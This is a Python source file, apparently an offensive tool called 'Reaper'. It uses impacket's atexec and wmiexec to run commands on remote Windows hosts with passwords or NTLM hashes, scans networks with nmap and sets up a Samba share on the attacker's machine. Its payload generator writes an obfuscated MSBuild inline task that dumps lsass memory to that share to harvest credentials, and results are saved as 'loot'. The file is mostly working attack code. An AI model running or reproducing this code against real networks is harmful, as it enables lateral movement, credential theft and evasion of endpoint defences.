from __future__ import division
from __future__ import print_function
import os
import re
import sys
import cmd
import time
import nmap
import ntpath
import socket
import random
import string
import logging
import argparse
import threading
import subprocess
import collections
import netifaces as ni
from base64 import b64encode
from datetime import datetime
from pebble import ProcessPool

from six import PY2
from impacket import version
from impacket import smbserver
from impacket.examples import logger
from impacket.krb5.keytab import Keytab
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import tsch, transport
from impacket.examples.utils import parse_target
from impacket.ntlm import compute_lmhash, compute_nthash
from impacket.dcerpc.v5.dcomrt import DCOMConnection, COMVERSION
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.smbconnection import SMBConnection, SMB_DIALECT, SMB2_DIALECT_002, SMB2_DIALECT_21



OUTPUT_FILENAME = '__' + str(time.time())
CODEC = sys.stdout.encoding
timestamp = str(datetime.fromtimestamp(time.time())).replace(' ', '_')

###################COLORS#################
color_RED = '\033[91m'
color_GRE = '\033[92m'
color_YELL = '\033[93m'
color_BLU = '\033[94m'
color_PURP = '\033[35m'
color_reset = '\033[0m'
green_plus = "{}[+]{}".format(color_GRE, color_reset)

reaper_banner = """

 ██{}▓{}      ██████  ▄▄▄          ██▀███  {}▓{}█████ ▄▄▄       ██{}▓{}███  {}▓{}█████  ██▀███  
{}▓{}██{}▒    ▒{}██    {}▒ ▒{}████▄       {}▓{}██ {}▒{} ██{}▒▓{}█   ▀{}▒{}████▄    {}▓{}██{}░{}  ██{}▒▓{}█   ▀ {}▓{}██ {}▒{} ██{}▒{}
{}▒{}██{}░    ░ ▓{}██▄   {}▒{}██  ▀█▄     {}▓{}██ {}░{}▄█ {}▒▒{}███  {}▒{}██  ▀█▄  {}▓{}██{}░{} ██{}▓▒▒{}███   {}▓{}██ {}░{}▄█ {}▒{}
{}▒{}██{}░      ▒{}   ██{}▒░{}██▄▄▄▄██    {}▒{}██▀▀█▄  {}▒▓{}█  ▄{}░{}██▄▄▄▄██ {}▒{}██▄█{}▓▒ ▒▒▓{}█  ▄ {}▒{}██▀▀█▄  
{}░{}██████{}▒▒{}██████{}▒▒ ▓{}█   {}▓{}██{}▒   ░{}██{}▓ ▒{}██{}▒░▒{}████{}▒▓{}█   {}▓{}██{}▒▒{}██{}▒ ░  ░░▒{}████{}▒░{}██{}▓ ▒{}██{}▒
░ ▒░▓  ░▒ ▒▓▒ ▒ ░ ▒▒   ▓▒{}█{}░   ░ ▒▓ ░▒▓░░░ ▒░ ░▒▒   ▓▒{}█{}░▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░ ▒  ░░ ░▒  ░ ░  ▒   ▒▒ ░     ░▒ ░ ▒░ ░ ░  ░ ▒   ▒▒ ░░▒ ░      ░ ░  ░  ░▒ ░ ▒░
  ░ ░   ░  ░  ░    ░   ▒        ░░   ░    ░    ░   ▒   ░░          ░     ░░   ░ 
    ░  ░      ░        ░  ░      ░        ░  ░     ░  ░            ░  ░   ░  {}                                                                                   
""".format(color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset)

cwd = os.path.abspath(os.path.dirname(__file__))

with open('{}/log.txt'.format(cwd), 'a') as f:
    f.write('{}{}{}'.format('\n', timestamp, '\n'))
    f.close()

################################################# START OF ATEXEC #########################################################################
class TSCH_EXEC:
    def __init__(self, username='', password='', domain='', hashes=None, aesKey=None, doKerberos=False, kdcHost=None,
                 command=None, sessionId=None, silentCommand=False):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__command = command
        self.__silentCommand = silentCommand
        self.sessionId = sessionId

        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def play(self, addr):
        stringbinding = r'ncacn_np:%s[\pipe\atsvc]' % addr
        rpctransport = transport.DCERPCTransportFactory(stringbinding)

        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                         self.__aesKey)
            rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
        try:
            self.doStuff(rpctransport, addr)
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            with open('{}/log.txt'.format(cwd), 'a') as f:
                f.write('{}: {}\n'.format(addr, e))
                f.close()
            logging.error('{}: {}'.format(addr, e))
            if str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >=0:
                logging.info('When STATUS_OBJECT_NAME_NOT_FOUND is received, try running again. It might work')

    def doStuff(self, rpctransport, addr):
        def output_callback(data):
            try:
                with open('{}/log.txt'.format(cwd), 'a') as f:
                    f.write('{}: {}\n'.format(addr, data.decode(CODEC)))
                    f.close()
                if logging.getLogger().level == logging.DEBUG:
                    print('{}: {}'.format(addr, data.decode(CODEC)))
            except UnicodeDecodeError:
                logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                              'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute atexec.py '
                              'again with -codec and the corresponding codec')
                print(data.decode(CODEC, errors='replace'))

        def xml_escape(data):
            replace_table = {
                 "&": "&amp;",
                 '"': "&quot;",
                 "'": "&apos;",
                 ">": "&gt;",
                 "<": "&lt;",
                 }
            return ''.join(replace_table.get(c, c) for c in data)

        def cmd_split(cmdline):
            cmdline = cmdline.split(" ", 1)
            cmd = cmdline[0]
            args = cmdline[1] if len(cmdline) > 1 else ''

            return [cmd, args]

        dce = rpctransport.get_dce_rpc()

        dce.set_credentials(*rpctransport.get_credentials())
        if self.__doKerberos is True:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.connect()
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        dce.bind(tsch.MSRPC_UUID_TSCHS)
        tmpName = ''.join([random.choice(string.ascii_letters) for _ in range(8)])
        tmpFileName = tmpName + '.tmp'

        if self.sessionId is not None:
            cmd, args = cmd_split(self.__command)
        else:
            cmd = "cmd.exe"
            args = "/C %s > %%windir%%\\Temp\\%s 2>&1" % (self.__command, tmpFileName)

        xml = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>%s</Command>
      <Arguments>%s</Arguments>
    </Exec>
  </Actions>
</Task>
        """ % ((xml_escape(cmd) if self.__silentCommand is False else self.__command.split()[0]),
            (xml_escape(args) if self.__silentCommand is False else " ".join(self.__command.split()[1:])))
        taskCreated = False
        try:
            with open('{}/log.txt'.format(cwd), 'a') as f:
                f.write('{}: Creating task \\{}\n'.format(addr, tmpName))
                f.close()
            if logging.getLogger().level == logging.DEBUG:
                logging.info('{}: Creating task \\{}'.format(addr, tmpName))
            tsch.hSchRpcRegisterTask(dce, '\\%s' % tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
            taskCreated = True

            with open('{}/log.txt'.format(cwd), 'a') as f:
                f.write('{}: Running task \\{}\n'.format(addr, tmpName))
                f.close()
            if logging.getLogger().level == logging.DEBUG:
                logging.info('{}: Running task \\{}'.format(addr, tmpName))
            done = False

            if self.sessionId is None:
                tsch.hSchRpcRun(dce, '\\%s' % tmpName)
            else:
                try:
                    tsch.hSchRpcRun(dce, '\\%s' % tmpName, flags=tsch.TASK_RUN_USE_SESSION_ID, sessionId=self.sessionId)
                except Exception as e:
                    if str(e).find('ERROR_FILE_NOT_FOUND') >= 0 or str(e).find('E_INVALIDARG') >= 0 :
                        logging.info('The specified session doesn\'t exist!')
                        done = True
                    else:
                        raise

            while not done:
                logging.debug('Calling SchRpcGetLastRunInfo for \\%s' % tmpName)
                resp = tsch.hSchRpcGetLastRunInfo(dce, '\\%s' % tmpName)
                if resp['pLastRuntime']['wYear'] != 0:
                    done = True
                else:
                    time.sleep(2)
            with open('{}/log.txt'.format(cwd), 'a') as f:
                f.write('{}: Deleting task \\{}\n'.format(addr, tmpName))
                f.close()
            if logging.getLogger().level == logging.DEBUG:
                logging.info('{}: Deleting task \\{}'.format(addr, tmpName))
            tsch.hSchRpcDelete(dce, '\\%s' % tmpName)
            taskCreated = False
        except tsch.DCERPCSessionError as e:
            logging.error(e)
            e.get_packet().dump()
        finally:
            if taskCreated is True:
                tsch.hSchRpcDelete(dce, '\\%s' % tmpName)

        if self.sessionId is not None:
            dce.disconnect()
            return

        if self.__silentCommand:
            dce.disconnect()
            return

        smbConnection = rpctransport.get_smb_connection()
        waitOnce = True
        while True:
            try:
                time.sleep(6)
                with open('{}/log.txt'.format(cwd), 'a') as f:
                    f.write('{}: Attempting to read ADMIN$\\Temp\\{}\n'.format(addr, tmpFileName))
                    f.close()
                if logging.getLogger().level == logging.DEBUG:
                    logging.info('{}: Attempting to read ADMIN$\\Temp\\{}'.format(addr, tmpFileName))
                smbConnection.getFile('ADMIN$', 'Temp\\%s' % tmpFileName, output_callback)
                break
            except Exception as e:
                if str(e).find('SHARING') > 0:
                    time.sleep(3)
                elif str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >= 0:
                    if waitOnce is True:
                        # We're giving it the chance to flush the file before giving up
                        time.sleep(3)
                        waitOnce = False
                    else:
                        raise
                else:
                    raise
        with open('{}/log.txt'.format(cwd), 'a') as f:
            f.write('{}: Deleting file ADMIN$\\Temp\\{}\n'.format(addr, tmpFileName))
            f.close()
        if logging.getLogger().level == logging.DEBUG:
            logging.debug('{}: Deleting file ADMIN$\\Temp\\{}'.format(addr, tmpFileName))
        smbConnection.deleteFile('ADMIN$', 'Temp\\%s' % tmpFileName)

        dce.disconnect()

########################################## END OF ATEXEC ############################################################################

########################################## START OF WMIEXEC #########################################################################
class WMIEXEC:
    def __init__(self, command='', username='', password='', domain='', hashes=None, aesKey=None, share=None,
                 noOutput=False, doKerberos=False, kdcHost=None, shell_type=None):
        self.__command = command
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__share = share
        self.__noOutput = noOutput
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__shell_type = shell_type
        self.shell = None
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, addr, silentCommand=False):
        if self.__noOutput is False and silentCommand is False:
            smbConnection = SMBConnection(addr, addr)
            if self.__doKerberos is False:
                smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            else:
                smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                            self.__nthash, self.__aesKey, kdcHost=self.__kdcHost)

            dialect = smbConnection.getDialect()
            with open('{}/log.txt'.format(cwd), 'a') as f:
                if dialect == SMB_DIALECT:
                    f.write("{}: SMBv1 dialect used\n".format(addr))
                elif dialect == SMB2_DIALECT_002:
                    f.write("{}: SMBv2.0 dialect used\n".format(addr))
                elif dialect == SMB2_DIALECT_21:
                    f.write("{}: SMBv2.1 dialect used\n".format(addr))
                else:
                    f.write("{}: SMBv3.0 dialect used\n".format(addr))
                f.close()

            if logging.getLogger().level == logging.DEBUG:
                if dialect == SMB_DIALECT:
                    logging.info("{}: SMBv1 dialect used".format(addr))
                elif dialect == SMB2_DIALECT_002:
                    logging.info("{}: SMBv2.0 dialect used".format(addr))
                elif dialect == SMB2_DIALECT_21:
                    logging.info("{}: SMBv2.1 dialect used".format(addr))
                else:
                    logging.info("{}: SMBv3.0 dialect used".format(addr))
        else:
            smbConnection = None

        dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                              self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
        try:
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL) # if firewall blocking program hangs here
            iWbemLevel1Login.RemRelease()

            win32Process, _ = iWbemServices.GetObject('Win32_Process')

            self.shell = RemoteShell(self.__share, win32Process, smbConnection, self.__shell_type, silentCommand)
            self.shell.onecmd(self.__command)
        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            with open('{}/log.txt'.format(cwd), 'a') as f:
                f.write('{}: {}\n'.format(addr, str(e)))
                f.close()
            logging.error('{}: {}'.format(addr, str(e)))
            if smbConnection is not None:
                smbConnection.logoff()
            dcom.disconnect()
            sys.stdout.flush()
            pass

        if smbConnection is not None:
            smbConnection.logoff()
        dcom.disconnect()


class RemoteShell(cmd.Cmd):
    def __init__(self, share, win32Process, smbConnection, shell_type, silentCommand=False):
        cmd.Cmd.__init__(self)
        self.__share = share
        self.__output = '\\' + OUTPUT_FILENAME
        self.__outputBuffer = str('')
        self.__shell = 'cmd.exe /Q /c '
        self.__shell_type = shell_type
        self.__pwsh = 'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '
        self.__win32Process = win32Process
        self.__transferClient = smbConnection
        self.__silentCommand = silentCommand
        self.__pwd = str('C:\\')
        self.__noOutput = False
        self.intro = '[!] Launching semi-interactive shell - Careful what you execute\n[!] Press help for extra shell commands'

        # We don't wanna deal with timeouts from now on.
        if self.__transferClient is not None:
            self.__transferClient.setTimeout(30000)
            self.do_cd('\\')
        else:
            self.__noOutput = True

        # If the user wants to just execute a command without cmd.exe, set raw command and set no output
        if self.__silentCommand is True:
            self.__shell = ''

    def do_cd(self, s):
        self.execute_remote('cd ' + s)
        if len(self.__outputBuffer.strip('\r\n')) > 0:
            print(self.__outputBuffer)
            self.__outputBuffer = ''
        else:
            if PY2:
                self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s.decode(sys.stdin.encoding)))
            else:
                self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s))
            self.execute_remote('cd ')
            self.__pwd = self.__outputBuffer.strip('\r\n')
            self.prompt = (self.__pwd + '>')
            if self.__shell_type == 'powershell':
                self.prompt = 'PS ' + self.prompt + ' '
            self.__outputBuffer = ''

    def default(self, line):
        # Let's try to guess if the user is trying to change drive
        if len(line) == 2 and line[1] == ':':
            # Execute the command and see if the drive is valid
            self.execute_remote(line)
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                # Something went wrong
                print(self.__outputBuffer)
                self.__outputBuffer = ''
            else:
                # Drive valid, now we should get the current path
                self.__pwd = line
                self.execute_remote('cd ')
                self.__pwd = self.__outputBuffer.strip('\r\n')
                self.prompt = (self.__pwd + '>')
                self.__outputBuffer = ''
        else:
            if line != '':
                self.send_data(line)

    def get_output(self):
        def output_callback(data):
            try:
                self.__outputBuffer += data.decode(CODEC)
            except UnicodeDecodeError:
                logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                              'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute wmiexec.py '
                              'again with -codec and the corresponding codec')
                self.__outputBuffer += data.decode(CODEC, errors='replace')

        if self.__noOutput is True:
            self.__outputBuffer = ''
            return

        while True:
            try:
                self.__transferClient.getFile(self.__share, self.__output, output_callback)
                break
            except Exception as e:
                if str(e).find('STATUS_SHARING_VIOLATION') >= 0:
                    # Output not finished, let's wait
                    time.sleep(1)
                    pass
                elif str(e).find('Broken') >= 0:
                    # The SMB Connection might have timed out, let's try reconnecting
                    logging.debug('Connection broken, trying to recreate it')
                    self.__transferClient.reconnect()
                    return self.get_output()
        self.__transferClient.deleteFile(self.__share, self.__output)

    def execute_remote(self, data, shell_type='cmd'):
        if shell_type == 'powershell':
            data = '$ProgressPreference="SilentlyContinue";' + data
            data = self.__pwsh + b64encode(data.encode('utf-16le')).decode()

        command = self.__shell + data

        if self.__noOutput is False:
            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output + ' 2>&1'
        if PY2:
            self.__win32Process.Create(command.decode(sys.stdin.encoding), self.__pwd, None)
        else:
            self.__win32Process.Create(command, self.__pwd, None)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data, self.__shell_type)
        with open('{}/drives.txt'.format(cwd), 'a') as f: # writing to a file gets around the issue of multithreading not being easily readable
            f.write(self.__outputBuffer)
            f.close()
        with open('{}/log.txt'.format(cwd), 'a') as f:
            f.write(self.__outputBuffer + '\n')
            f.close()
        if logging.getLogger().level == logging.DEBUG:
            print(self.__outputBuffer)
        self.__outputBuffer = ''


class AuthFileSyntaxError(Exception):
    '''raised by load_smbclient_auth_file if it encounters a syntax error
    while loading the smbclient-style authentication file.'''

    def __init__(self, path, lineno, reason):
        self.path = path
        self.lineno = lineno
        self.reason = reason

    def __str__(self):
        return 'Syntax error in auth file %s line %d: %s' % (
            self.path, self.lineno, self.reason)


def load_smbclient_auth_file(path):
    '''Load credentials from an smbclient-style authentication file (used by
    smbclient, mount.cifs and others).  returns (domain, username, password)
    or raises AuthFileSyntaxError or any I/O exceptions.'''

    lineno = 0
    domain = None
    username = None
    password = None
    for line in open(path):
        lineno += 1

        line = line.strip()

        if line.startswith('#') or line == '':
            continue

        parts = line.split('=', 1)
        if len(parts) != 2:
            raise AuthFileSyntaxError(path, lineno, 'No "=" present in line')

        (k, v) = (parts[0].strip(), parts[1].strip())

        if k == 'username':
            username = v
        elif k == 'password':
            password = v
        elif k == 'domain':
            domain = v
        else:
            raise AuthFileSyntaxError(path, lineno, 'Unknown option %s' % repr(k))

    return (domain, username, password)

############################################################################### END OF WMIEXEC#####################################################

def do_ip(inpu, local_ip): # check if the inputted ips are up so we dont scan thigns we dont need to
    print('\n[scanning hosts]')
    scanner = nmap.PortScanner()
    if os.path.isfile(inpu):  # if its in a file the arguments are different
        scanner.scan(arguments='-n -sn -iL {}'.format(inpu))
    else:
        scanner.scan(hosts=inpu, arguments='-n -sn')
    uphosts = scanner.all_hosts()

    try:
        uphosts.remove(local_ip)  # no point in attacking ourselves
    except:
        pass

    hostnames = []
    ips_from_hostnames = []
    for ip in uphosts:
        try:
            tmp = socket.gethostbyaddr(ip)[0]
            hostnames.append(tmp)
            ips_from_hostnames.append(socket.gethostbyname(tmp))
        except:
            pass

    print('[scan complete]')

    return uphosts, hostnames, ips_from_hostnames

def gen_payload(share_name, payload_name, drive_letter):
    targetname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    taskname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithDataSegs = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithFullMemory = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithHandleData = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithThreadInfo = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithTokenInformation = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 25)))
    filename = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    dumpTyp = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    prochandle = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    procid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    Dump = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    GetPID = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    processes = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    id = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    process = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 15)))
    IsAdministrator = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 25)))
    p = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    l = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    s = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    a = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))

    xml_payload = r"""<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
<!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe SimpleTasks.csproj -->
	<Target Name="%s">
            <%s /> 
          </Target>
          <UsingTask
            TaskName="%s"
            TaskFactory="CodeTaskFactory"
            AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
            <Task>

              <Code Type="Class" Language="cs">
              <![CDATA[
using System; using System.Diagnostics; using System.Runtime.InteropServices; using System.Security.Principal; using System.Threading; using Microsoft.Build.Framework; using Microsoft.Build.Utilities;
public class %s : Task, ITask {
		public enum Typ : uint
        {
            %s = 0x00000001,
            %s = 0x00000002,
            %s = 0x00000004,
            %s = 0x00001000,
            %s = 0x00040000,
        };

        [System.Runtime.InteropServices.DllImport("dbghelp.dll",
              EntryPoint = "MiniDumpWriteDump",
              CallingConvention = CallingConvention.StdCall,
              CharSet = CharSet.Unicode,
              ExactSpelling = true, SetLastError = true)]
        static extern bool MiniDumpWriteDump(
              IntPtr hProcess,
              uint processId,
              IntPtr hFile,
              uint dumpType,
              IntPtr expParam,
              IntPtr userStreamParam,
              IntPtr callbackParam);

        public static bool %s(string %s, Typ %s, IntPtr %s, uint %s)
        {
            using (var fs = new System.IO.FileStream(%s, System.IO.FileMode.Create, System.IO.FileAccess.Write, System.IO.FileShare.None))
            {
                bool bRet = MiniDumpWriteDump(
                  %s,
                  %s,
                  fs.SafeFileHandle.DangerousGetHandle(),
                  (uint)%s,
                  IntPtr.Zero,
                  IntPtr.Zero,
                  IntPtr.Zero);
                if (!bRet)
                {
                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
                }
                return bRet;
            }
        }

        public static int %s() {
            string %s = "s";
            string %s = "l";
            string %s = "a";
            var %s = System.Diagnostics.Process.GetProcessesByName(%s + %s + %s + %s + %s);
            var %s = 0;
            foreach (var %s in %s)
            {
                %s = %s.Id;
            }

            return %s;
        }

        public static bool %s()
        {
            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))
                      .IsInRole(WindowsBuiltInRole.Administrator);
        }

        public override bool Execute()
		{
            if (%s())
            {
                string filePath = "%s:\\" + System.Net.Dns.GetHostName() + ".dmp";
                Process %s = Process.GetProcessById(%s());
                %s(filePath, (Typ.%s | Typ.%s | Typ.%s | Typ.%s | Typ.%s), %s.Handle, (uint)%s.Id);

            }
			return true;
        }}
                                ]]>
                        </Code>
                </Task>
        </UsingTask>
</Project>""" % (targetname, taskname, taskname, taskname, MiniDumpWithDataSegs, MiniDumpWithFullMemory, MiniDumpWithHandleData, MiniDumpWithThreadInfo, MiniDumpWithTokenInformation, Dump, filename, dumpTyp, prochandle, procid, filename, prochandle, procid, dumpTyp, GetPID, s, l, a, processes, l, s, a, s, s, id, process, processes, id, process, id, IsAdministrator, IsAdministrator, drive_letter, p, GetPID, Dump, MiniDumpWithFullMemory, MiniDumpWithDataSegs, MiniDumpWithHandleData, MiniDumpWithThreadInfo, MiniDumpWithTokenInformation, p, p)

    with open('/var/tmp/{}/{}.xml'.format(share_name, payload_name), 'w') as f:
        f.write(xml_payload)
        f.close()

def setup_share():
    share_name = ''.join(random.choices(string.ascii_lowercase, k=20))
    share_user = ''.join(random.choices(string.ascii_lowercase, k=10))
    share_pass = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=35))
    payload_name = ''.join(random.choices(string.ascii_lowercase, k=10))
    share_group = ''.join(random.choices(string.ascii_lowercase, k=10))

    print("\n[Generating share]")
    # making the directory
    print("{} Creating the share folder".format(green_plus))
    os.system("sudo mkdir /var/tmp/" + share_name)

    # smb.conf edits
    data = """[{}]
    path = /var/tmp/{}
    public = no
    force user = {}
    force group = {}
    browseable = yes
    create mask = 0664
    force create mode = 0664
    directory mask = 0775
    force directory mode = 0775
    read only = no
    comment = The share
    """.format(share_name, share_name, share_user, share_group)



    # copy old smb.conf file so its safe
    print("{} Backing up the smb.conf file".format(green_plus))
    os.system("sudo cp /etc/samba/smb.conf " + cwd + "/")
    print("{} Making modifications".format(green_plus))
    with open('/etc/samba/smb.conf', 'a') as f:
        f.write(data)
        f.close()

    # create the user for the share
    # generate the group
    print("{} Creating the group".format(green_plus))
    os.system("sudo groupadd --system " + share_group)
    # make the user
    print("{} Creating the user".format(green_plus))
    os.system("sudo useradd --system --no-create-home --group " + share_group + " -s /bin/false " + share_user)
    # give the user access to the share folder
    print("{} Giving the user rights".format(green_plus))
    os.system("sudo chown -R " + share_user + ":" + share_group + " /var/tmp/" + share_name)
    # expand access to the group
    print("{} Giving the group rights".format(green_plus))
    os.system("sudo chmod -R g+w /var/tmp/" + share_name)
    # create the smbusers password
    print("{} Editing the SMB password".format(green_plus))
    proc = subprocess.Popen(['sudo', 'smbpasswd', '-a', '-s', share_user], stdin=subprocess.PIPE)
    proc.communicate(input=share_pass.encode() + '\n'.encode() + share_pass.encode() + '\n'.encode())
    # restart the smb service
    print("{}[+]{} Restarting the SMB service".format(color_BLU, color_reset))
    os.system("sudo systemctl restart smbd")

    return share_name, share_user, share_pass, payload_name, share_group

def alt_exec():

    yes = input('Press enter to exit ')
    print("\n{}[-]{} Cleaning up please wait".format(color_BLU, color_reset))

    if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
        os.system('sudo rm {}/drives.txt'.format(cwd))

    try:
        os.system("sudo systemctl stop smbd")
    except BaseException as e:
        pass

    try:
        os.system("sudo cp " + cwd + "/smb.conf /etc/samba/smb.conf")
    except BaseException as e:
        pass

    try:
        os.system("sudo rm " + cwd + "/smb.conf")
    except BaseException as e:
        pass

    try:
        os.system("sudo userdel " + share_user)
    except BaseException as e:
        pass

    try:
        os.system("sudo groupdel " + share_group)
    except BaseException as e:
        pass

    try:
        os.system("sudo mv /var/tmp/{} {}/loot/'{}'".format(share_name, cwd, timestamp))
    except BaseException as e:
        pass
    print("{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C".format(color_BLU,
                                                                                                         color_reset))
    exit(0)

def exec_netuse(ip, domain):
    try:
        executer = WMIEXEC('net use', username, password, domain, options.hashes, options.aesKey, options.share, False,
                           options.k, options.dc_ip, 'cmd')
        executer.run(ip, False)
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback

            traceback.print_exc()
        with open('{}/log.txt'.format(cwd), 'a') as f:
            f.write('{}: {}\n'.format(ip, str(e)))
            f.close()

def auto_drive(addresses, domain): # really helpful so you dont have to know which drive letter to use
    print('{}[+]{} Determining the best drive letter to use this may take a moment...'.format(color_BLU, color_reset))
    failed_logons = 0

    if len(addresses) > 3 and options.localauth == False: # Anti lockout check
        for x in range(3):
            try:
                executer = WMIEXEC('net use', username, password, domain, options.hashes, options.aesKey, options.share,
                                   False, options.k, options.dc_ip, 'cmd')
                executer.run(addresses[x], False)
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback

                    traceback.print_exc()
                with open('{}/log.txt'.format(cwd), 'a') as f:
